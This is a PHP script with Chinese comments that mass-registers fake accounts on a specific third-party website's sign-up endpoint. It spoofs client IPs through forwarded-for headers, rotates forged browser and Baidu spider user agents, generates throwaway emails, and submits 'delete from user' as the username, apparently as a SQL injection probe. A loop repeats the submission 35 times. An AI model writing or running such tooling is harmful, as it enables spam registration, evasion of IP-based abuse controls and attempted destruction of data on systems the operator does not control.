<?php

/**
 *再书脚本
 */
class againBook{

    public function againsend(){
        $url   = "www.twicebook.top/account/registe";
        $str   = "来再书舒宁电器计深圳科技划深圳环时间科技舒宁电器发改委王者荣耀阿萨德飞今年可能都十分难受的是快点快点看呃呃我发哦臀大这种明年年初你的请问如同和国内出现的公婆撒啊基地散发的书法大赛吃呀看的豆腐花苏里科夫的绝哦我么么哒哦求欧盟租房安顿的";
        $name  = $this->getH($str);
        $email = "abc" . time() . "@qq.com";
        $pass  = md5('abc');
        $data  = array(
            'name'     => "delete from user",
            'password' => $pass,
            'email'    => $email
        );
        $res   = $this->sendcurl($data);
        echo $res;
        die;
        $res = self::curl_post_contents($url, $data, 100);
        echo $res;
    }

    /**
     * curl Post数据
     */
    static function curl_post_contents($url, $data = array(), $timeout = 10){
        //$userAgent = 'xx5.com PHP5 (curl) ' . phpversion();
        $referer = $url;
        if(!is_array($data) || !$url){
            return '';
        }

        $ch = curl_init('http://www.163.com');
        curl_setopt($ch, CURLOPT_URL, $url);            //设置访问的url地址
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);            //设置超时
        //curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);   //用户访问代理 User-Agent
        //伪造蜘蛛IP
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:220.181.108.91', 'CLIENT-IP:220.181.108.91'));
        //伪造蜘蛛头部
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.qintech.com/search/spider.html)');
        curl_setopt($ch, CURLOPT_REFERER, $referer);      //设置 referer
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);      //跟踪301
        curl_setopt($ch, CURLOPT_POST, 1);             //指定post数据
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);      //添加变量
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);      //返回结果
        $content = curl_exec($ch);
        curl_close($ch);
        return $content;
    }

    public function sendcurl($data){
        $ch        = curl_init();
        $curlurl   = "http://www.twicebook.top/account/registe";
        $referurl  = "http://www.twicebook.top";
        $ip        = mt_rand(11, 191) . "." . mt_rand(0, 240) . "." . mt_rand(1, 240) . "." . mt_rand(1, 240);   //随机ip
        $agentarry = [
            //PC端的UserAgent
            "safari 5.1 – MAC"             => "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
            "safari 5.1 – Windows"         => "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Firefox 38esr"                => "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
            "IE 11"                        => "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
            "IE 9.0"                       => "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0",
            "IE 8.0"                       => "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
            "IE 7.0"                       => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
            "IE 6.0"                       => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
            "Firefox 4.0.1 – MAC"          => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Firefox 4.0.1 – Windows"      => "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Opera 11.11 – MAC"            => "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
            "Opera 11.11 – Windows"        => "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
            "Chrome 17.0 – MAC"            => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
            "傲游（Maxthon）"                  => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
            "腾讯TT"                         => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)",
            "世界之窗（The World） 2.x"          => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
            "世界之窗（The World） 3.x"          => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
            "360浏览器"                       => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
            "搜狗浏览器 1.x"                    => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)",
            "Avant"                        => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
            "Green Browser"                => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
            //移动端口
            "safari iOS 4.33 – iPhone"     => "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
            "safari iOS 4.33 – iPod Touch" => "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
            "safari iOS 4.33 – iPad"       => "Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
            "Android N1"                   => "Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Android QQ浏览器 For android"    => "MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Android Opera Mobile"         => "Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10",
            "Android Pad Moto Xoom"        => "Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
            "BlackBerry"                   => "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
            "WebOS HP Touchpad"            => "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0",
            "UC标准"                         => "NOKIA5700/ UCWEB7.0.2.37/28/999",
            "UCOpenwave"                   => "Openwave/ UCWEB7.0.2.37/28/999",
            "UC Opera"                     => "Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999",
            "微信内置浏览器"                      => "Mozilla/5.0 (Linux; Android 6.0; 1503-M02 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036558 Safari/537.36 MicroMessenger/6.3.25.861 NetType/WIFI Language/zh_CN",
            // ""=>"",

        ];
        //$useragent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11";  //要得到类似这样useranget 可以自定义
        $useragent = $agentarry[array_rand($agentarry, 1)];  //随机浏览器useragent
        $header    = array(
            'CLIENT-IP:' . $ip,
            'X-FORWARDED-FOR:' . $ip,
        );    //构造ip
        curl_setopt($ch, CURLOPT_URL, $curlurl); //要抓取的网址
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

        curl_setopt($ch, CURLOPT_REFERER, $referurl);  //模拟来源网址
        curl_setopt($ch, CURLOPT_USERAGENT, $useragent); //模拟常用浏览器的useragent

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);      //跟踪301
        curl_setopt($ch, CURLOPT_POST, 1);             //指定post数据
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);      //添加变量
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);      //返回结果

        $page_content = curl_exec($ch);
        curl_close($ch);
        return $page_content;
    }

    public function createRandomStr($length){
        $str    = "来计划laijihua阿萨德飞今年可能都十分难受的是快点快点看呃呃我发哦臀大这种明年年初你的请问如同和国内出现的公婆撒啊基地散发的书法大赛吃呀看的豆腐花苏里科夫的绝哦我么么哒哦求欧盟租房安顿的";
        $strlen = strlen($str);
        $len    = &$strlen;
        while($length > $strlen){
            $str .= $str;
            $strlen += $len;
        }
        $str = str_shuffle($str);
        return substr($str, 0, $length);
    }

    public function getH($str){
        // 利用preg_split函数，将汉字字符串拆分成数组，第一个参数是正则匹配，必须加上u，因为是utf8编码
        // 这里不能使用substr或者mb_substr等，因为这些方法是针对字符有效的，汉字占2或者3个字符
        $str = preg_split('//u', $str, -1, PREG_SPLIT_NO_EMPTY);

        // 利用shuffle函数，打乱汉字数组
        // 不能使用str_shuffle函数，因为那个是打乱字符的
        shuffle($str);

        // 从数组中截取前4个元素，得到的就是一个汉字数组
        $str = array_slice($str, 0, 4);

        // implode：将数组拼凑成字符串
        $str = implode('', $str);
        return $str;
    }

}

$m = new againBook();
for($i = 0; $i < 35; $i++){
    $m->againsend();
}